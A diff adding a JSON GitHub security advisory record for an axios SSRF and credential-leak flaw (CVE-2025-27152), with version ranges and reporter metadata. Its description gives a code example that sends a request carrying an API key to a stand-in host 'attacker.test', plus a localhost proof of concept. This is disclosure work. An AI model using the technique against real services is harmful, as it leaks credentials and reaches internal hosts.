@@ -1,0 +1,113 @@
+[
+  {
+    "ghsa_id": "GHSA-jr5f-v2jv-69x6",
+    "cve_id": "CVE-2025-27152",
+    "url": "https://api.github.com/repos/axios/axios/security-advisories/GHSA-jr5f-v2jv-69x6",
+    "html_url": "https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6",
+    "summary": "Possible SSRF and Credential Leakage via Absolute URL in axios Requests",
+    "description": "### Summary\r\n\r\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).\r\nReference: axios/axios#6463\r\n\r\nI have identified a similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\r\n\r\n### Details\r\n\r\nConsider the following code snippet:\r\n\r\n```js\r\nimport axios from \"axios\";\r\n\r\nconst internalAPIClient = axios.create({\r\n  baseURL: \"http://example.test/api/v1/users/\",\r\n  headers: {\r\n    \"X-API-KEY\": \"1234567890\",\r\n  },\r\n});\r\n\r\n// const userId = \"123\";\r\nconst userId = \"http://attacker.test/\";\r\n\r\nawait internalAPIClient.get(userId); // SSRF\r\n```\r\n\r\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\r\n\r\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\r\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\r\n\r\n### PoC\r\n\r\nFollow the steps below to reproduce the issue:\r\n\r\n1.\tSet up two simple HTTP servers:\r\n\r\n```\r\nmkdir /tmp/server1 /tmp/server2\r\necho \"this is server1\" > /tmp/server1/index.html \r\necho \"this is server2\" > /tmp/server2/index.html\r\npython -m http.server -d /tmp/server1 10001 &\r\npython -m http.server -d /tmp/server2 10002 &\r\n```\r\n\r\n\r\n2.\tCreate a script (e.g., main.js):\r\n\r\n```js\r\nimport axios from \"axios\";\r\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\r\nconst response = await client.get(\"http://localhost:10002/\");\r\nconsole.log(response.data);\r\n```\r\n\r\n3.\tRun the script:\r\n\r\n```\r\n$ node main.js\r\nthis is server2\r\n```\r\n\r\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\r\n\r\n### Impact\r\n\r\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\r\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\r\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.\r\n",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "jasonsaayman",
+      "id": 4814473,
+      "node_id": "MDQ6VXNlcjQ4MTQ0NzM=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/4814473?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jasonsaayman",
+      "html_url": "https://github.com/jasonsaayman",
+      "followers_url": "https://api.github.com/users/jasonsaayman/followers",
+      "following_url": "https://api.github.com/users/jasonsaayman/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jasonsaayman/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jasonsaayman/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jasonsaayman/subscriptions",
+      "organizations_url": "https://api.github.com/users/jasonsaayman/orgs",
+      "repos_url": "https://api.github.com/users/jasonsaayman/repos",
+      "events_url": "https://api.github.com/users/jasonsaayman/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jasonsaayman/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-jr5f-v2jv-69x6",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-27152",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2025-03-09T00:23:33Z",
+    "published_at": "2025-03-07T07:41:03Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "axios"
+        },
+        "vulnerable_version_range": "<= 1.29.9",
+        "patched_versions": "1.30.2",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [],
+    "cwe_ids": [],
+    "credits": [
+      {
+        "login": "lambdasawa",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "lambdasawa",
+          "id": 9388092,
+          "node_id": "MDQ6VXNlcjkzODgwOTI=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/9388092?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/lambdasawa",
+          "html_url": "https://github.com/lambdasawa",
+          "followers_url": "https://api.github.com/users/lambdasawa/followers",
+          "following_url": "https://api.github.com/users/lambdasawa/following{/other_user}",
+          "gists_url": "https://api.github.com/users/lambdasawa/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/lambdasawa/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/lambdasawa/subscriptions",
+          "organizations_url": "https://api.github.com/users/lambdasawa/orgs",
+          "repos_url": "https://api.github.com/users/lambdasawa/repos",
+          "events_url": "https://api.github.com/users/lambdasawa/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/lambdasawa/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  }
+]
